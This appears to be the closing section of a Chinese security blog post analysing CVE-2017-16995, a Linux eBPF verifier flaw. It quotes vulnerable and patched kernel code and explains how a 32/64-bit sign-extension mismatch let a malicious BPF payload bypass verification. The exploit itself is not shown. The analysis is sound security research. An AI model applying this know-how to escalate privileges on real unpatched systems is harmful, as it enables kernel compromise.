<p>在存在漏洞的版本中，我们第一句payload中的赋值操作，是由以下语句完成的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    &#x2F;* case: R &#x3D; imm</span><br><span class="line">     * remember the value we stored into this reg</span><br><span class="line">     *&#x2F;</span><br><span class="line">    regs[insn-&gt;dst_reg].type &#x3D; CONST_IMM;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm &#x3D; insn-&gt;imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在新版本中，是由以下语句完成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">else &#123;</span><br><span class="line">    &#x2F;* case: R &#x3D; imm</span><br><span class="line">     * remember the value we stored into this reg</span><br><span class="line">     *&#x2F;</span><br><span class="line">    regs[insn-&gt;dst_reg].type &#x3D; SCALAR_VALUE;</span><br><span class="line">    if (BPF_CLASS(insn-&gt;code) &#x3D;&#x3D; BPF_ALU64) &#123;</span><br><span class="line">        __mark_reg_known(regs + insn-&gt;dst_reg,</span><br><span class="line">                 insn-&gt;imm);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        __mark_reg_known(regs + insn-&gt;dst_reg,</span><br><span class="line">                 (u32)insn-&gt;imm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先来看看<code>__mark_reg_known</code>的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Mark the unknown part of a register (variable offset or scalar value) as</span><br><span class="line"> * known to have the value @imm.</span><br><span class="line"> *&#x2F;</span><br><span class="line">static void __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">    reg-&gt;id &#x3D; 0;</span><br><span class="line">    reg-&gt;var_off &#x3D; tnum_const(imm);</span><br><span class="line">    reg-&gt;smin_value &#x3D; (s64)imm;</span><br><span class="line">    reg-&gt;smax_value &#x3D; (s64)imm;</span><br><span class="line">    reg-&gt;umin_value &#x3D; imm;</span><br><span class="line">    reg-&gt;umax_value &#x3D; imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么在新版本中，我们原本的第一句payload将会触发<code>__mark_reg_known(regs + insn-&gt;dst_reg,
(u32)insn-&gt;imm);</code>操作</p>
<p>可以看到我们传入的立即数将会先被强制转换为无符号32位整型并传入<code>__mark_reg_known</code>函数中</p>
<p>注意，<code>__mark_reg_known</code>函数对应的参数为无符号64位整形，那么被强转后的立即数值便会进行32位至64的无符号拓展，也即<code>0xffffffff -&gt; 0x00000000ffffffff</code></p>
<p>接着，我们看看<code>tnum_const</code>函数的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define TNUM(_v, _m)    (struct tnum)&#123;.value &#x3D; _v, .mask &#x3D; _m&#125;</span><br><span class="line">&#x2F;* A completely unknown value *&#x2F;</span><br><span class="line">const struct tnum tnum_unknown &#x3D; &#123; .value &#x3D; 0, .mask &#x3D; -1 &#125;;</span><br><span class="line"></span><br><span class="line">struct tnum tnum_const(u64 value)</span><br><span class="line">&#123;</span><br><span class="line">    return TNUM(value, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，此函数即是保存了<code>0x00000000ffffffff</code> 的值至<code>reg-&gt;var_off.value</code>中</p>
<p>继续，我们来看看原本第二句paylaod的执行情况</p>
<p>在原来版本中，“恒跳转”由以下语句判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp;</span><br><span class="line">    (opcode &#x3D;&#x3D; BPF_JEQ || opcode &#x3D;&#x3D; BPF_JNE) &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].type &#x3D;&#x3D; CONST_IMM &amp;&amp;</span><br><span class="line">    regs[insn-&gt;dst_reg].imm &#x3D;&#x3D; insn-&gt;imm) &#123;</span><br><span class="line">    if (opcode &#x3D;&#x3D; BPF_JEQ) &#123;</span><br><span class="line">        &#x2F;* if (imm &#x3D;&#x3D; imm) goto pc+off;</span><br><span class="line">         * only follow the goto, ignore fall-through</span><br><span class="line">         *&#x2F;</span><br><span class="line">        *insn_idx +&#x3D; insn-&gt;off;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;* if (imm !&#x3D; imm) goto pc+off;</span><br><span class="line">         * only follow fall-through branch, since</span><br><span class="line">         * that&#39;s where the program will go</span><br><span class="line">         *&#x2F;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">other_branch &#x3D; push_stack(env, *insn_idx + insn-&gt;off + 1, *insn_idx);</span><br><span class="line">if (!other_branch)</span><br><span class="line">    return -EFAULT;</span><br><span class="line">    .........</span><br></pre></td></tr></table></figure>
<p>而在新版本中，由以下语句判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* detect if R &#x3D;&#x3D; 0 where R was initialized to zero earlier *&#x2F;</span><br><span class="line">if (BPF_SRC(insn-&gt;code) &#x3D;&#x3D; BPF_K &amp;&amp;</span><br><span class="line">    (opcode &#x3D;&#x3D; BPF_JEQ || opcode &#x3D;&#x3D; BPF_JNE) &amp;&amp;</span><br><span class="line">    dst_reg-&gt;type &#x3D;&#x3D; SCALAR_VALUE &amp;&amp;</span><br><span class="line">    tnum_equals_const(dst_reg-&gt;var_off, insn-&gt;imm)) &#123;</span><br><span class="line">    if (opcode &#x3D;&#x3D; BPF_JEQ) &#123;</span><br><span class="line">        &#x2F;* if (imm &#x3D;&#x3D; imm) goto pc+off;</span><br><span class="line">         * only follow the goto, ignore fall-through</span><br><span class="line">         *&#x2F;</span><br><span class="line">        *insn_idx +&#x3D; insn-&gt;off;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;* if (imm !&#x3D; imm) goto pc+off;</span><br><span class="line">         * only follow fall-through branch, since</span><br><span class="line">         * that&#39;s where the program will go</span><br><span class="line">         *&#x2F;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到主要的差别就是第四个判断条件，那么来看看<code>tnum_equals_const</code>的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Returns true if @a is a known constant *&#x2F;</span><br><span class="line">static inline bool tnum_is_const(struct tnum a)</span><br><span class="line">&#123;</span><br><span class="line">    return !a.mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* Returns true if @a &#x3D;&#x3D; tnum_const(@b) *&#x2F;</span><br><span class="line">static inline bool tnum_equals_const(struct tnum a, u64 b)</span><br><span class="line">&#123;</span><br><span class="line">    return tnum_is_const(a) &amp;&amp; a.value &#x3D;&#x3D; b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，<code>insn-&gt;imm</code>在被传入<code>tnum_equals_const</code>后，被强制转换成了无符号64位整型，也就是说进行比较的立即数进行了这样的转变<code>0xffffffff -&gt; 0xfffffffffffffff</code></p>
<p>接着进行比较，从上面的分析中我们可以知道此时<code>reg-&gt;var_off.value</code>的值为<code>0x00000000ffffffff</code> ，那么<code>return tnum_is_const(a) &amp;&amp; a.value == b;</code>就如下所示</p>
<p><code>return 1 &amp;&amp; 0x00000000ffffffff == 0xfffffffffffffff; = return 0</code></p>
<p>也就是说，判断条件不成立，与旧版本就此停止不继续向下执行不同，新版本由于判断条件不为真，于是将会继续执行，将可能执行的分支进一步检测，从而避免了加载我们的恶意bpf指令</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>payload中实际利用的代码部分还没讲，后面再写一篇，顺便可以讲些linux内核中的一些重要结构</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ph4ntom</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ph4ntonn.github.io/CVE-2017-16995.html">https://ph4ntonn.github.io/CVE-2017-16995.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ph4ntonn.github.io" target="_blank">ph4ntom's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/binary/">binary</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/how-ptmalloc-malloc-free.html"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">how ptmalloc malloc &amp;&amp; free</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/Double-free.html" title="Double free"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-23</div><div class="title">Double free</div></div></a></div><div><a href="/ptmalloc.html" title="ptmalloc机制闲扯"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-24</div><div class="title">ptmalloc机制闲扯</div></div></a></div><div><a href="/ret2dl.html" title="ret2dl"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-13</div><div class="title">ret2dl</div></div></a></div><div><a href="/bypass-Canary.html" title="bypass Canary"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-11</div><div class="title">bypass Canary</div></div></a></div><div><a href="/partial-write.html" title="partial overwrite && stack smash"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-27</div><div class="title">partial overwrite && stack smash</div></div></a></div><div><a href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc && free"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-04</div><div class="title">how ptmalloc malloc && free</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ph4ntom</div><div class="author-info__description">The wheel turns,nothing is ever new</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ph4ntonn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ph4ntonn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:ph4ntom11235@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客～</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFbpf"><span class="toc-number">1.</span> <span class="toc-text">什么是bpf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bpf%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">bpf指令集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bpf%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">bpf加载流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">5.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/CVE-2017-16995.html" title="CVE-2017-16995"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2017-16995"/></a><div class="content"><a class="title" href="/CVE-2017-16995.html" title="CVE-2017-16995">CVE-2017-16995</a><time datetime="2021-01-12T04:06:13.000Z" title="发表于 2021-01-12 12:06:13">2021-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc &amp;&amp; free"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how ptmalloc malloc &amp;&amp; free"/></a><div class="content"><a class="title" href="/how-ptmalloc-malloc-free.html" title="how ptmalloc malloc &amp;&amp; free">how ptmalloc malloc &amp;&amp; free</a><time datetime="2020-12-04T08:43:17.000Z" title="发表于 2020-12-04 16:43:17">2020-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/partial-write.html" title="partial overwrite &amp;&amp; stack smash"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="partial overwrite &amp;&amp; stack smash"/></a><div class="content"><a class="title" href="/partial-write.html" title="partial overwrite &amp;&amp; stack smash">partial overwrite &amp;&amp; stack smash</a><time datetime="2020-11-27T09:06:02.000Z" title="发表于 2020-11-27 17:06:02">2020-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ret2dl.html" title="ret2dl"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2dl"/></a><div class="content"><a class="title" href="/ret2dl.html" title="ret2dl">ret2dl</a><time datetime="2020-11-13T03:45:20.000Z" title="发表于 2020-11-13 11:45:20">2020-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/bypass-Canary.html" title="bypass Canary"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="bypass Canary"/></a><div class="content"><a class="title" href="/bypass-Canary.html" title="bypass Canary">bypass Canary</a><time datetime="2020-11-11T10:19:56.000Z" title="发表于 2020-11-11 18:19:56">2020-11-11</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By ph4ntom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: '9E1TK8SCjpPaeeW41wldJbk1-gzGzoHsz',
      appKey: 'HyvuhJHOsDtafuWIxYSzbLXH',
      placeholder: 'xor ebx,ebx;push 0xdeadbeef;mov ecx,[esp];mov edx,0x400;mov al,0x03;int 0x80',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '//i0.hdslb.com/bfs/emote/',
      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_親親":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_偷笑":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_再見":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_冷漠":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_發怒":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_發財":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_可愛":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_吐血":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_呆":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_嘔吐":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_困":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_壞笑":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_大佬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_大哭":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_委屈":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_害羞":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_尷尬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_微笑":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_思考":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_驚嚇":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
      enableQQ: false,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick,mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign({}, initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>